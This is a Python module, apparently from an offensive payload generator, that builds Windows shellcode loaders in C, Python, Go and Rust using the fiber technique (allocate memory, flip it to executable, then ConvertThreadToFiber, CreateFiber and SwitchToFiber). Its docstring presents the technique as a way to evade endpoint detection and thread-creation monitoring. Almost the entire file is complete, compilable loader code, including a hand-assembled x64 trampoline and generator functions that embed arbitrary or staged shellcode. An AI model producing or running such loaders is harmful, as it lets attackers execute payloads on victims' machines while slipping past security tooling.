"""Loader: win_fiber — VirtualAlloc(RX) → memcpy → ConvertThreadToFiber → CreateFiber → SwitchToFiber.

Tier 2. Avoids CreateThread entirely.
Fibers are user-mode cooperative threads. SwitchToFiber transfers execution
to the fiber's start routine without creating a new OS thread, bypassing
CreateThread-based kernel callbacks (PsSetCreateThreadNotifyRoutine).

Execution flow:
  1. Allocate RX memory and copy shellcode (two-stage: alloc RW, flip to RX)
  2. ConvertThreadToFiber: turn the current thread into a fiber
  3. CreateFiber: create a fiber with shellcode as start routine
  4. SwitchToFiber: transfer control; shellcode runs in the current thread

Evasion property:
  - No CreateThread / CreateRemoteThread in call graph
  - No new OS thread created — fiber execution is invisible to thread-list tools

Still triggers on:
  - VirtualProtect(RX) on anonymous memory
  - ConvertThreadToFiber + CreateFiber combo (monitored by modern EDR)
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_fiber")

# {sc_embed}    — global declarations (encrypted array + key, or empty for staged)
# {sc_init}     — in-main init block (decrypt loop or file-reading code)
# {main_decl}   — main() signature (void or int argc, char *argv[])
_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

{sc_embed}

/* Trampoline passed to CreateFiber: calls shellcode as a plain function, then
   switches back to the main fiber so main() can clean up and exit normally.
   Without this, the shellcode's ret falls into the fiber exit handler
   (ExitThread), which terminates the thread before cleanup. */
typedef struct {{ LPVOID main_fiber; LPVOID sc_mem; }} FiberArgs;

VOID CALLBACK fiber_trampoline(LPVOID param) {{
    FiberArgs *a = (FiberArgs *)param;
    ((void(*)(void))a->sc_mem)();
    SwitchToFiber(a->main_fiber);
}}

{main_decl} {{
    {sc_init}
    LPVOID mem = VirtualAlloc(NULL, sc_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) {{
        fprintf(stderr, "[-] VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    DWORD old_protect;
    if (!VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old_protect)) {{
        fprintf(stderr, "[-] VirtualProtect failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    LPVOID main_fiber = ConvertThreadToFiber(NULL);
    if (!main_fiber) {{
        fprintf(stderr, "[-] ConvertThreadToFiber failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    FiberArgs args = {{ main_fiber, mem }};
    LPVOID sc_fiber = CreateFiber(0, fiber_trampoline, &args);
    if (!sc_fiber) {{
        fprintf(stderr, "[-] CreateFiber failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    SwitchToFiber(sc_fiber);   /* returns here after trampoline switches back */

    DeleteFiber(sc_fiber);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import sys

{sc_bytes}

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype         = ctypes.c_void_p
kernel32.ConvertThreadToFiber.restype = ctypes.c_void_p
kernel32.CreateFiber.restype          = ctypes.c_void_p

mem = kernel32.VirtualAlloc(None, len(sc),
                            0x3000,   # MEM_COMMIT | MEM_RESERVE
                            0x04)     # PAGE_READWRITE
if not mem:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(sc))

old = ctypes.c_ulong(0)
if not kernel32.VirtualProtect(ctypes.c_void_p(mem), len(sc),
                                0x20,  # PAGE_EXECUTE_READ
                                ctypes.byref(old)):
    sys.exit(1)

main_fiber = kernel32.ConvertThreadToFiber(None)
if not main_fiber:
    sys.exit(1)

# Without this wrapper the shellcode's `ret` falls into the Windows fiber exit
# handler (ExitThread), which kills the Python thread before the process can
# clean up normally.  The wrapper calls the shellcode as a regular function
# then explicitly SwitchToFibers back to the main fiber so Python exits cleanly.
@ctypes.WINFUNCTYPE(None, ctypes.c_void_p)
def _fiber_entry(param):
    ctypes.WINFUNCTYPE(None)(mem)()
    kernel32.SwitchToFiber(ctypes.c_void_p(main_fiber))

sc_fiber = kernel32.CreateFiber(0, _fiber_entry, None)
if not sc_fiber:
    sys.exit(1)

kernel32.SwitchToFiber(ctypes.c_void_p(sc_fiber))
kernel32.DeleteFiber(ctypes.c_void_p(sc_fiber))
"""


# {sc_embed}    — package-level declarations (or empty for staged)
# {sc_init}     — first statement(s) in main (decrypt loop or file-reading)
# {sc_imports}  — extra import entries, e.g. \n\t"os" for staged
_GO_TEMPLATE = """\
package main

import (
\t"encoding/binary"
\t"runtime"
\t"syscall"
\t"unsafe"{sc_imports}
)

{sc_embed}

func main() {{
\t{sc_init}
\t// Pin to one OS thread: ConvertThreadToFiber is thread-local state and
\t// SwitchToFiber must be called from the same thread that was converted.
\truntime.LockOSThread()
\tdefer runtime.UnlockOSThread()

\tk32                   := syscall.NewLazyDLL("kernel32.dll")
\tpVirtualAlloc         := k32.NewProc("VirtualAlloc")
\tpVirtualFree          := k32.NewProc("VirtualFree")
\tpVirtualProtect       := k32.NewProc("VirtualProtect")
\tpConvertThreadToFiber := k32.NewProc("ConvertThreadToFiber")
\tpCreateFiber          := k32.NewProc("CreateFiber")
\tpSwitchToFiber        := k32.NewProc("SwitchToFiber")
\tpDeleteFiber          := k32.NewProc("DeleteFiber")
\tpRtlMove              := k32.NewProc("RtlMoveMemory")

\t// Resolve SwitchToFiber address for the machine-code trampoline.
\tif err := pSwitchToFiber.Find(); err != nil {{
\t\treturn
\t}}
\tswfAddr := pSwitchToFiber.Addr()

\taddr, _, _ := pVirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)
\tif addr == 0 {{
\t\treturn
\t}}
\tpRtlMove.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
\tvar old uint32
\tif r, _, _ := pVirtualProtect.Call(addr, uintptr(len(sc)), 0x20,
\t\tuintptr(unsafe.Pointer(&old))); r == 0 {{
\t\tpVirtualFree.Call(addr, 0, 0x8000)
\t\treturn
\t}}

\tmf, _, _ := pConvertThreadToFiber.Call(0)
\tif mf == 0 {{
\t\tpVirtualFree.Call(addr, 0, 0x8000)
\t\treturn
\t}}

\t// Machine-code fiber trampoline (45 bytes).
\t// Fiber start routines enter with RSP%16==8 (standard Windows call frame).
\t// A bare call r11 gives the shellcode RSP%16==0 (wrong), misaligning its
\t// subsequent API calls and corrupting fiber state on return.
\t// sub rsp,8 corrects alignment; add rsp,8 restores it after the shellcode.
\t//
\t//   sub rsp,8           48 83 EC 08
\t//   mov r11, scAddr     49 BB [8B]   call r11  41 FF D3
\t//   add rsp,8           48 83 C4 08
\t//   mov rcx, mainFiber  48 B9 [8B]
\t//   mov r11, swfAddr    49 BB [8B]   call r11  41 FF D3
\t//   ret                 C3
\tconst trampSz = 45
\ttp, _, _ := pVirtualAlloc.Call(0, trampSz, 0x3000, 0x04)
\tif tp == 0 {{
\t\tpVirtualFree.Call(addr, 0, 0x8000)
\t\treturn
\t}}
\tvar tb [trampSz]byte
\t// sub rsp, 8
\ttb[0], tb[1], tb[2], tb[3] = 0x48, 0x83, 0xEC, 0x08
\t// mov r11, scAddr
\ttb[4], tb[5] = 0x49, 0xBB
\tbinary.LittleEndian.PutUint64(tb[6:], uint64(addr))
\t// call r11
\ttb[14], tb[15], tb[16] = 0x41, 0xFF, 0xD3
\t// add rsp, 8
\ttb[17], tb[18], tb[19], tb[20] = 0x48, 0x83, 0xC4, 0x08
\t// mov rcx, mainFiber
\ttb[21], tb[22] = 0x48, 0xB9
\tbinary.LittleEndian.PutUint64(tb[23:], uint64(mf))
\t// mov r11, swfAddr
\ttb[31], tb[32] = 0x49, 0xBB
\tbinary.LittleEndian.PutUint64(tb[33:], uint64(swfAddr))
\t// call r11 + ret
\ttb[41], tb[42], tb[43] = 0x41, 0xFF, 0xD3
\ttb[44] = 0xC3
\tpRtlMove.Call(tp, uintptr(unsafe.Pointer(&tb[0])), trampSz)
\tif r, _, _ := pVirtualProtect.Call(tp, trampSz, 0x20,
\t\tuintptr(unsafe.Pointer(&old))); r == 0 {{
\t\tpVirtualFree.Call(tp, 0, 0x8000)
\t\tpVirtualFree.Call(addr, 0, 0x8000)
\t\treturn
\t}}

\tscFiber, _, _ := pCreateFiber.Call(0, tp, 0)
\tif scFiber == 0 {{
\t\tpVirtualFree.Call(tp, 0, 0x8000)
\t\tpVirtualFree.Call(addr, 0, 0x8000)
\t\treturn
\t}}
\tpSwitchToFiber.Call(scFiber)
\tpDeleteFiber.Call(scFiber)
\tpVirtualFree.Call(tp, 0, 0x8000)
\tpVirtualFree.Call(addr, 0, 0x8000)
}}
"""

# {sc_bytes} is inside fn main() — single block (decl + decrypt or file-read)
_RS_TEMPLATE = """\
#![allow(non_snake_case)]
use std::ptr;
use std::sync::atomic::{{AtomicPtr, Ordering}};

#[link(name = "kernel32")]
extern "system" {{
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32,
                    flProtect: u32) -> *mut u8;
    fn VirtualFree(lpAddress: *mut u8, dwSize: usize, dwFreeType: u32) -> i32;
    fn VirtualProtect(lpAddress: *mut u8, dwSize: usize, flNewProtect: u32,
                      lpflOldProtect: *mut u32) -> i32;
    fn ConvertThreadToFiber(lpParameter: *mut u8) -> *mut u8;
    fn CreateFiber(dwStackSize: usize,
                   lpStartAddress: unsafe extern "system" fn(*mut u8),
                   lpParameter: *mut u8) -> *mut u8;
    fn SwitchToFiber(lpFiber: *mut u8);
    fn DeleteFiber(lpFiber: *mut u8);
}}

static MAIN_FIBER: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
static SC_MEM:     AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());

unsafe extern "system" fn fiber_trampoline(_param: *mut u8) {{
    let sc_ptr = SC_MEM.load(Ordering::Relaxed);
    let entry: unsafe extern "system" fn() = std::mem::transmute(sc_ptr);
    entry();
    SwitchToFiber(MAIN_FIBER.load(Ordering::Relaxed));
}}

fn main() {{
    {sc_bytes}
    unsafe {{
        let p = VirtualAlloc(ptr::null_mut(), sc.len(), 0x3000, 0x04);
        if p.is_null() {{ return; }}
        ptr::copy_nonoverlapping(sc.as_ptr(), p, sc.len());
        let mut old: u32 = 0;
        if VirtualProtect(p, sc.len(), 0x20, &mut old) == 0 {{
            VirtualFree(p, 0, 0x8000); return;
        }}
        SC_MEM.store(p, Ordering::Relaxed);
        let mf = ConvertThreadToFiber(ptr::null_mut());
        if mf.is_null() {{ VirtualFree(p, 0, 0x8000); return; }}
        MAIN_FIBER.store(mf, Ordering::Relaxed);
        let sc_fiber = CreateFiber(0, fiber_trampoline, ptr::null_mut());
        if sc_fiber.is_null() {{ VirtualFree(p, 0, 0x8000); return; }}
        SwitchToFiber(sc_fiber);
        DeleteFiber(sc_fiber);
        VirtualFree(p, 0, 0x8000);
    }}
}}
"""


def generate_c(shellcode: bytes, staged: bool = False) -> str:
    """Return a compilable C loader using ConvertThreadToFiber + CreateFiber + SwitchToFiber."""
    if staged:
        embed, init = _render.c_staged_sc("sc")
        main_decl = "int main(int argc, char *argv[])"
    else:
        embed, init = _render.c_sc_block(shellcode, "sc")
        main_decl = "int main(void)"
    return _C_TEMPLATE.format(sc_embed=embed, sc_init=init, main_decl=main_decl)


def generate_python(shellcode: bytes, staged: bool = False) -> str:
    """Return a Python ctypes loader using fiber execution."""
    sc_bytes = _render.py_staged_sc("sc") if staged else _render.py_sc_block(shellcode, "sc")
    return _PY_TEMPLATE.format(sc_bytes=sc_bytes)


def generate_go(shellcode: bytes, staged: bool = False) -> str:
    """Return a Go loader using ConvertThreadToFiber + CreateFiber + SwitchToFiber."""
    if staged:
        embed, init, imports = _render.go_staged_sc("sc")
    else:
        embed, init, imports = _render.go_sc_block(shellcode, "sc")
    return _GO_TEMPLATE.format(sc_embed=embed, sc_init=init, sc_imports=imports)


def generate_rust(shellcode: bytes, staged: bool = False) -> str:
    """Return a Rust loader using ConvertThreadToFiber + CreateFiber + SwitchToFiber."""
    sc_bytes = _render.rust_staged_sc("sc") if staged else _render.rust_sc_block(shellcode, "sc")
    return _RS_TEMPLATE.format(sc_bytes=sc_bytes)
